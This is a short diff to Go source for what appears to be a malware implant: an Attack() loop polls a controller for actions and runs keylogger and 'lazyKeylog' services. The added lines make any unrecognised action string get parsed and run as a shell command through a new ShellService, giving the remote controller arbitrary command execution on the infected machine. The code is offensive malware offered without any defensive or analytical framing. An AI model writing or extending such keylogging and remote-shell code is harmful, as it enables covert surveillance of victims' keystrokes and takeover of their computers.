@@ -21,6 +21,7 @@ type ClosableService interface {
 const (
 	NoActionMessage = "No action"
 	ActionKey       = "action"
+	BodyKey         = "body"
 	StopAction      = "stop-(keylog|lazyKeylog)"
 )
 
@@ -36,6 +37,7 @@ var (
 		"keylog":     &Keylogger{Mutex: &sync.Mutex{}, Channel: make(chan struct{})},
 		"lazyKeylog": &LazyKeylogger{Keylogger{Mutex: &sync.Mutex{}, Channel: make(chan struct{})}},
 	}
+	shellService = &ShellService{}
 )
 
 func Attack() {
@@ -58,8 +60,10 @@ func Attack() {
 			} else if resp[ActionKey] != NoActionMessage {
 				if actions[resp[ActionKey]] != nil {
 					actions[resp[ActionKey]].Run(name)
-				} else {
+				} else if stoppableActions[resp[ActionKey]] != nil {
 					stoppableActions[resp[ActionKey]].Run(name)
+				} else {
+					shellService.Run(utils.ParseShellCommand(resp[ActionKey]), name)
 				}
 			}
 		}
